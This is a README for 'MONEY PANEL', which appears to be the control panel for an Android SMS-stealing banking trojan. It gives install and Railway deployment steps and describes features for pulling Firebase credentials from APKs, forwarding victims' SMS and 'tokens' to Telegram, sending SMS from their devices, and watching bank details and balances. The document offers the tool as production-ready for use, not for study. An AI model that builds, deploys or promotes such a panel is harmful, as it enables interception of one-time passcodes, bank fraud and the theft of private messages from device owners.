# 💰 MONEY PANEL

Device Management Console with Telegram Bot Integration

## ✅ Features

- **APK Scanning** - Extract Firebase credentials from APK (Browser-side)
- **SMS Forwarding** - Device SMS → Telegram (Bot tab)
- **Telegram to SMS** - Send SMS from Telegram chat
- **Firebase Management** - Monitor devices, SMS, bank details
- **Auto SMS Refresh** - Every 45 seconds
- **Balance Display** - Bank balance with ₹ symbol
- **Bot Features** - Auto token forward, multiple format support

## 🚀 Quick Start

```bash
cd "money new panel"
npm install
npm start
# Open http://localhost:3000
```

## 📦 Railway Deployment

```bash
# 1. Push to GitHub
git init
git add .
git commit -m "Deploy Money Panel"
git push origin main

# 2. Railway.app
# - New Project → Deploy from GitHub
# - Add variables (optional):
#   TELEGRAM_BOT_TOKEN
#   TELEGRAM_CHAT_ID

# 3. Done!
```

## 🤖 Bot Configuration

Open device → **Bot tab**:

1. Enter Bot Token (from @BotFather)
2. Enter Chat ID (from @userinfobot)
3. Select SIM & Format
4. Click **Start Bot**

### SMS Forwarding (Auto):
- Device receives SMS → Forwarded to Telegram
- Real-time monitoring every 4 seconds

### Telegram to SMS:
Send in Telegram:
```
To: +919876543210
Message: Your text here
```

### Auto Token Forward:
- Fill "Auto-Forward Number"
- Any message in Telegram → Sends as SMS

## 📊 Files

```
money new panel/
├── server.js                  # Main server
├── package.json               # Dependencies
├── .env.example               # Config template
└── luffy-panel.vercel.app/    # Frontend
    ├── index.html             # MONEY PANEL UI
    ├── style.css              # Styling
    └── app.js                 # Bot + APK features
```

## 🔒 Security

- ✅ No external services
- ✅ APK scanned in browser (client-side)
- ✅ Telegram via YOUR Railway server
- ✅ Environment variables for secrets
- ✅ Direct Firebase connection

## 📱 Telegram Setup

**Bot Token:**
1. Telegram → @BotFather
2. Send `/newbot`
3. Copy token

**Chat ID:**
1. Telegram → @userinfobot
2. Get your ID

Add to Railway Variables tab or local `.env` file.

## ✅ Ready for Production

All features working:
- SMS forwarding ✅
- APK scanning ✅
- Bot integration ✅
- Railway deployment ✅

Deploy and enjoy! 🎉
